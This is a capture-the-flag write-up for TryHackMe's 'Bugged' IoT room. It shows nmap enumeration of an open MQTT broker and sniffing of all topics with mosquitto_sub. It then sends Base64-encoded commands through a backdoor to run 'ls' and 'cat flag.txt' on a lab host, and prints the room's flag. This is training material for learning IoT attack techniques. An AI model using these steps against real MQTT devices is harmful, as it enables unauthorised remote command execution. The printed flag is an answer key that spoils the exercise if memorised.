## Bugged - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/bugged)

<i>John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?</i>

**IP: 10.10.11.207**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: IoT <br>

**Tools Used**: Nmap, mosquitto<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan.

  ```
  nmap -sC -sV -T5 -p- 10.10.11.207

  PORT     STATE SERVICE                  VERSION
  1883/tcp open  mosquitto version 2.0.14
  | mqtt-subscribe: 
  |   Topics and their most recent payloads: 
  |     storage/thermostat: {"id":9627988469898628051,"temperature":23.117846}
  |     $SYS/broker/load/connections/15min: 0.11
  |     $SYS/broker/load/connections/1min: 0.92
  |     $SYS/broker/load/messages/received/15min: 27.21
  |     $SYS/broker/load/sockets/15min: 0.11
  |     $SYS/broker/load/messages/sent/1min: 92.43
  |     $SYS/broker/load/messages/sent/5min: 59.72
  |     patio/lights: {"id":10599074294978596043,"color":"GREEN","status":"ON"}
  |     livingroom/speaker: {"id":5179602141438436907,"gain":65}
  |     kitchen/toaster: {"id":12633863342270390288,"in_use":false,"temperature":154.87157,"toast_time":290}
  |     $SYS/broker/messages/sent: 485
  |     $SYS/broker/uptime: 319 seconds
  |     $SYS/broker/bytes/sent: 1941
  |     $SYS/broker/publish/bytes/received: 16447
  |     $SYS/broker/store/messages/bytes: 303
  |     $SYS/broker/version: mosquitto version 2.0.14
  |     $SYS/broker/messages/received: 485
  |     $SYS/broker/load/bytes/received/15min: 1294.78
  |     $SYS/broker/load/messages/received/1min: 92.43
  |     $SYS/broker/load/sockets/5min: 0.27
  |     $SYS/broker/load/bytes/sent/15min: 108.91
  |     $SYS/broker/load/connections/5min: 0.27
  |     $SYS/broker/load/sockets/1min: 0.92
  |     $SYS/broker/load/bytes/sent/1min: 369.73
  |     $SYS/broker/bytes/received: 23062
  |     $SYS/broker/load/bytes/received/1min: 4501.39
  |     $SYS/broker/load/messages/sent/15min: 27.21
  |     $SYS/broker/load/messages/received/5min: 59.72
  |     $SYS/broker/load/bytes/sent/5min: 238.94
  |_    $SYS/broker/load/bytes/received/5min: 2845.96
  ```
  
- Now, I started exploring `mosquitto` and found this [tool](https://github.com/kh4sh3i/MQTT-Pentesting) that we will use for exploitation.

---

## 🌐 Exploitation 

- First, we are going to subscribe to all IoT topics.

  ```
  mosquitto_sub -t '#' -h 10.10.11.207 -v
  
  storage/thermostat {"id":10762101610023627149,"temperature":24.102463}
  yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
  patio/lights {"id":2951336267348203198,"color":"ORANGE","status":"OFF"}
  frontdeck/camera {"id":6783776374738167164,"yaxis":-95.966225,"xaxis":-98.9164,"zoom":0.2082497,"movement":false}
  kitchen/toaster {"id":1356733472987702499,"in_use":true,"temperature":146.51863,"toast_time":349}
  livingroom/speaker {"id":14010203911659004628,"gain":75}
  storage/thermostat {"id":15947993585055285088,"temperature":24.496363}
  livingroom/speaker {"id":885354157039362202,"gain":44}
  patio/lights {"id":334276671834765765,"color":"PURPLE","status":"OFF"}
  kitchen/toaster {"id":4657780720477698668,"in_use":false,"temperature":141.28236,"toast_time":217}
  storage/thermostat {"id":6952037601393545817,"temperature":23.74218}
  frontdeck/camera {"id":14339557377162674645,"yaxis":-51.74562,"xaxis":38.341354,"zoom":1.3615317,"movement":false}
  livingroom/speaker {"id":11779071931945522459,"gain":48}
  patio/lights {"id":9818751930686087080,"color":"GREEN","status":"OFF"}
  storage/thermostat {"id":16884961924665331713,"temperature":23.49692}
  kitchen/toaster {"id":3312959592236425634,"in_use":false,"temperature":151.1816,"toast_time":252}
  livingroom/speaker {"id":1886436783539312463,"gain":72}
  storage/thermostat {"id":15205688319286668668,"temperature":24.277239}
  patio/lights {"id":3316543141431468804,"color":"ORANGE","status":"ON"}
  frontdeck/camera {"id":12049042104346502166,"yaxis":-35.886383,"xaxis":106.18591,"zoom":3.243253,"movement":false}
  kitchen/toaster {"id":17732017368443943284,"in_use":false,"temperature":149.4004,"toast_time":146}
  livingroom/speaker {"id":17709858190912822109,"gain":45}
  storage/thermostat {"id":2130987102212397998,"temperature":23.555523}
  patio/lights {"id":9934299393751544745,"color":"WHITE","status":"ON"}
  storage/thermostat {"id":11641418668587660941,"temperature":23.854708}
  livingroom/speaker {"id":10319268659221036012,"gain":60}
  yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
  kitchen/toaster {"id":7122176429576762502,"in_use":false,"temperature":159.00429,"toast_time":313}
  storage/thermostat {"id":3492924801559384411,"temperature":23.590889}
  patio/lights {"id":10894769894638089400,"color":"PURPLE","status":"OFF"}
  frontdeck/camera {"id":8259376364976281413,"yaxis":22.614594,"xaxis":-65.95687,"zoom":0.45953158,"movement":false}
  livingroom/speaker {"id":12463733112131929432,"gain":43}
  storage/thermostat {"id":11888077407684249205,"temperature":23.188974}
  kitchen/toaster {"id":2431047821465503922,"in_use":true,"temperature":145.16739,"toast_time":255}
  patio/lights {"id":2980296776301318354,"color":"GREEN","status":"ON"}
  livingroom/speaker {"id":10633409225820070005,"gain":69}
  storage/thermostat {"id":14494242988804460776,"temperature":23.68221}
  ^C   
  ```
  
- When you decode this Base64 strings you will get this parameters:

  ```
  {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"} 
  ```
  
- So now, we are going to publish to a topic. Start the first command again and then use `mosquitto_pub` to publish a topic. You will see your command published to subscriptions.
  Let the subscriptions run in one terminal and publish from another terminal.

  ```
  mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '{HELP}' -h 10.10.11.207 -d
  Client null sending CONNECT
  Client null received CONNACK (0)
  Client null sending PUBLISH (d0, q0, r0, m1, 'yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/sub', ... (6 bytes))
  Client null sending DISCONNECT
  
  mosquitto_sub -t '#' -h 10.10.11.207 -v
  storage/thermostat {"id":6420015945026965606,"temperature":24.065857}
  yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/sub {HELP}
  ```

- Now let's encode our command with Base64 and publish it:

  ```
  mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "SEVMUAo=" -h 10.10.11.207 -d

  mosquitto_sub -t '#' -h 10.10.11.207 -v
  storage/thermostat {"id":8527740269761492985,"temperature":23.499147}
  XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub SEVMUAo=
  U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
  livingroom/speaker {"id":6527046317500335545,"gain":64}
  ```

- There it is! Decode the string so you can get this:

  ```
  Invalid message format.
  Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
  ```

- OK, now we have a format on how to execute commands. Let's do it!

  ```
  echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}' | base64
  eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNN
  RCIsICJhcmciOiAibHMifQo=
  
  mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo=" -h 10.10.11.207 -d

  mosquitto_sub -t '#' -h 10.10.11.207 -v
  kitchen/toaster {"id":15187721126378853252,"in_use":false,"temperature":155.26814,"toast_time":274}
  XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo=
  U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9
  ```

- After decoding the string, we got flag location.

  ```
  echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9' | base64 -d
  {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}
  ```

- Now just read the flag with `cat`.

  ```
  {"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}

  echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}' | base64   
  eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0K
  
  mosquitto_pub -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0K" -h 10.10.11.207 -d

  mosquitto_sub -t '#' -h 10.10.11.207 -v
  storage/thermostat {"id":14455707374372220000,"temperature":24.212593}
  XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0K
  U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
  patio/lights {"id":6140930077618560691,"color":"RED",
  
  echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9' | base64 -d
  {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"} 
  ```

- LEGOOOOOOOOOOOOOOO! First IoT pwnage! Such a fun room!
---

## 🏁 Flags

- **Flag**: `flag{18d44fc0707ac8dc8be45bb83db54013}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, just learning MQTT.`

- What did I learn?
  `A lot, this is my first IoT pwnage and I had so much fun doing it!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
